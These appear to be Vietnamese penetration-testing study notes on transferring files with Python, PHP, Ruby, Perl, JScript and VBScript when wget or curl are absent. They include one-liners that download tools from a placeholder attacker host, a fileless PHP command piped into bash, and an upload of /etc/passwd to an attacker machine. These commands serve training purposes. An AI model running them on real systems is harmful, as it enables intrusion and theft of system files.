# Transferring Files with Code

## Mục tiêu

Khi pentest, nếu target không có `wget`, `curl`, `scp`, SMB hoặc các tool transfer thông thường, ta có thể dùng ngôn ngữ lập trình có sẵn để download/upload file.

Các ngôn ngữ thường gặp:

- Linux: Python, PHP, Perl, Ruby
- Windows: JavaScript/VBScript qua `cscript.exe`, `mshta.exe`
- Một số Windows cũng có Python/PHP/Ruby/Perl nếu được cài thêm

## Kiểm tra interpreter trên target

Linux:

```bash
which python3 python2 python php ruby perl
```
Windows:

```
where python
where php
where cscript
where mshta
```

## Python Download

Python 2:

```
python2.7 -c 'import urllib;urllib.urlretrieve("http://ATTACKER/LinEnum.sh", "LinEnum.sh")'
```

Python 3:

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATTACKER/LinEnum.sh", "LinEnum.sh")'
```

- `-c`: chạy code Python trực tiếp từ command line
- `urlretrieve(URL, output)`: tải file từ URL và lưu ra output

## PHP Download

Dùng `file_get_contents()` + `file_put_contents()`:

```
php -r '$file = file_get_contents("http://ATTACKER/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

- `-r`: chạy code PHP trực tiếp
- `file_get_contents()`: lấy nội dung từ URL
- `file_put_contents()`: ghi nội dung ra file

Dùng `fopen()`:

```
php -r 'const BUFFER = 1024; $fremote = fopen("http://ATTACKER/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

## PHP Fileless

Tải script và pipe sang bash:

```
php -r '$lines = @file("http://ATTACKER/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Flow:

```
PHP tải nội dung script -> echo ra stdout -> bash thực thi
```

## Ruby Download

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://ATTACKER/LinEnum.sh")))'
```

- `-e`: chạy code Ruby trực tiếp
- `net/http`: thư viện HTTP của Ruby
- `File.write()`: ghi nội dung ra file

## Perl Download

```
perl -e 'use LWP::Simple; getstore("http://ATTACKER/LinEnum.sh", "LinEnum.sh");'
```

- `LWP::Simple`: thư viện Perl để gửi HTTP request
- `getstore(URL, file)`: tải URL và lưu ra file

## JavaScript Download trên Windows

Tạo file `wget.js`:

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Chạy bằng `cscript.exe`:

```
cscript.exe /nologo wget.js http://ATTACKER/PowerView.ps1 PowerView.ps1
```

## VBScript Download trên Windows

Tạo file `wget.vbs`:

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Chạy:

```
cscript.exe /nologo wget.vbs http://ATTACKER/PowerView.ps1 PowerView2.ps1
```

## Upload bằng Python3 requests

Trên Pwnbox chạy uploadserver:

```
python3 -m uploadserver
```

Trên target upload file:

```
python3 -c 'import requests;requests.post("http://PWNBOX_IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Dạng dễ hiểu:

```
import requests

url = "http://PWNBOX_IP:8000/upload"
file = open("/etc/passwd", "rb")
r = requests.post(url, files={"files": file})
```

## Ghi nhớ

- Không có `wget/curl` thì thử Python/PHP/Ruby/Perl.
- Linux thường có ít nhất một interpreter.
- Windows có thể dùng `cscript.exe` để chạy JS/VBS.
- Download = attacker -> target.
- Upload = target -> attacker.
- Với upload, có thể dùng `python3 -m uploadserver` trên Pwnbox và Python `requests` trên target.
- Luôn kiểm tra file sau khi tải: `ls -l`, `file`, `md5sum`